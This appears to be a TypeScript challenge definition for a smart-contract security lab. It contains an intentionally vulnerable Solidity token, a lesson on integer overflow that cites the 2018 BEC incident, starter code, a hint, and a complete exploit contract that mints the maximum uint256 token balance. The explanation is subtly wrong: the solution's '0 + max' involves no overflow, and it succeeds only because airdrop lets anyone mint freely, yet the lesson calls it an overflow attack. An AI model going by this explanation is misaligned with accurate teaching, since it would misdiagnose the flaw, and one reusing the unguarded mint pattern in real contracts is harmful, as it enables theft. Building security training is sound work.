import type { VulnerabilityChallenge } from "@/types/vulnerability";

const OVERFLOW_TOKEN_SOURCE = `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract OverflowToken {
    string public name = "Overflow Token";
    string public symbol = "OVF";
    uint8 public decimals = 18;
    
    mapping(address => uint256) public balanceOf;
    uint256 public totalSupply;
    
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Mint(address indexed to, uint256 value);
    
    constructor() {
        balanceOf[msg.sender] = 1000 * 10**uint256(decimals);
        totalSupply = 1000 * 10**uint256(decimals);
    }
    
    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "Insufficient balance");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        emit Transfer(msg.sender, to, amount);
        return true;
    }
    
    // VULNERABILITY: unchecked block disables overflow protection!
    // This simulates Solidity 0.7.x behavior where overflow doesn't revert
    function airdrop(address[] calldata recipients, uint256 amount) external {
        for (uint256 i = 0; i < recipients.length; i++) {
            unchecked {
                balanceOf[recipients[i]] += amount;  // Can overflow!
                totalSupply += amount;                // Can also overflow!
            }
            emit Mint(recipients[i], amount);
        }
    }
    
    function getBalance(address account) external view returns (uint256) {
        return balanceOf[account];
    }
}`;

export const erc20OverflowChallenge: VulnerabilityChallenge = {
  id: "erc20-overflow",
  title: "ERC20 Integer Overflow",
  category: "arithmetic",
  difficulty: "intermediate",

  incident: {
    name: "BEC Token Overflow",
    date: "April 2018",
    losses: "Potentially unlimited token minting",
    references: [
      "https://medium.com/@peckshield/vulnerability-alert-bec-token-smart-contract-batchoverflow-5de3c2b99a58",
    ],
  },

  description: `# Integer Overflow Vulnerability

## Background

Starting from Solidity 0.8.0, integer arithmetic operations automatically check for overflow and underflow. However, developers can disable these checks using \`unchecked\` blocks:

\`\`\`solidity
// Normal: overflow reverts
uint256 x = type(uint256).max;
x + 1;  // REVERTS!

// Unchecked: overflow wraps around (like Solidity 0.7.x)
unchecked {
    uint256 y = type(uint256).max;
    y + 1;  // Returns 0 (overflow!)
}
\`\`\`

## The Vulnerability

This token contract uses an \`unchecked\` block in the \`airdrop\` function, disabling overflow protection:

\`\`\`solidity
function airdrop(address[] calldata recipients, uint256 amount) external {
    for (uint256 i = 0; i < recipients.length; i++) {
        unchecked {
            balanceOf[recipients[i]] += amount;  // Can overflow!
            totalSupply += amount;                // Can also overflow!
        }
    }
}
\`\`\`

## Attack Vector

By passing a carefully crafted \`amount\` value, you can cause an overflow:
- \`type(uint256).max\` (2^256 - 1) is the maximum uint256 value
- Adding any positive amount to a non-zero balance can overflow

**Example**: If you pass \`amount = type(uint256).max\` and the recipient has 0 balance:
- \`0 + type(uint256).max = type(uint256).max\` (huge balance!)

## Your Task

1. Analyze the overflow vulnerability in \`airdrop\`
2. Craft an exploit to give yourself a huge token balance
3. Your goal: Get more than 1,000,000 tokens in your exploit contract

**Target**: The \`OverflowToken\` contract uses \`unchecked\` blocks that allow overflow.`,

  starterCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IOverflowToken {
    function airdrop(address[] calldata recipients, uint256 amount) external;
    function balanceOf(address account) external view returns (uint256);
    function getBalance(address account) external view returns (uint256);
    function totalSupply() external view returns (uint256);
}

contract Exploit {
    IOverflowToken public token;
    
    constructor(address _token) {
        token = IOverflowToken(_token);
    }
    
    function attack() external {
        // TODO: Exploit the integer overflow in airdrop()
        // Goal: Get more than 1,000,000 tokens (10^24 with 18 decimals)
        // 
        // HINT: The unchecked block allows overflow
        // type(uint256).max = 2^256 - 1
        // What happens if you airdrop with amount = type(uint256).max?
    }
}`,

  hint: "The unchecked block allows overflow. Call airdrop with amount = type(uint256).max (max uint256 value) and your contract as the recipient. When 0 + max is calculated in unchecked block, you get max uint256 tokens!",

  setup: {
    contracts: [
      {
        name: "OverflowToken",
        source: OVERFLOW_TOKEN_SOURCE,
      },
    ],
    attackerBalance: "10",
  },

  exposedFunctions: [
    {
      name: "balanceOf",
      signature: "balanceOf(address)",
      inputs: [{ name: "account", type: "address" }],
      outputs: [{ name: "", type: "uint256" }],
      stateMutability: "view",
    },
    {
      name: "totalSupply",
      signature: "totalSupply()",
      inputs: [],
      outputs: [{ name: "", type: "uint256" }],
      stateMutability: "view",
    },
    {
      name: "airdrop",
      signature: "airdrop(address[],uint256)",
      inputs: [
        { name: "recipients", type: "address[]" },
        { name: "amount", type: "uint256" },
      ],
      outputs: [],
      stateMutability: "nonpayable",
    },
  ],

  constructorParams: {
    params: [
      {
        name: "_token",
        type: "address",
        description: "The OverflowToken contract address",
      },
    ],
    autoFillOptions: {
      useDeployedContract: "OverflowToken",
    },
  },

  successCondition: {
    checkTokenBalance: {
      token: "OverflowToken",
      holder: "Exploit",
      minBalance: "1000000000000000000000000",
    },
  },

  solution: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IOverflowToken {
    function airdrop(address[] calldata recipients, uint256 amount) external;
    function balanceOf(address account) external view returns (uint256);
}

contract Exploit {
    IOverflowToken public token;
    
    constructor(address _token) {
        token = IOverflowToken(_token);
    }
    
    function attack() external {
        // The unchecked block in airdrop() allows overflow!
        // When we pass amount = type(uint256).max and balance is 0:
        // unchecked { balance[recipient] += max; } -> balance = max
        
        address[] memory recipients = new address[](1);
        recipients[0] = address(this);
        
        // type(uint256).max = 2^256 - 1 (maximum uint256 value)
        token.airdrop(recipients, type(uint256).max);
        
        // Now this contract has type(uint256).max tokens!
    }
}`,
};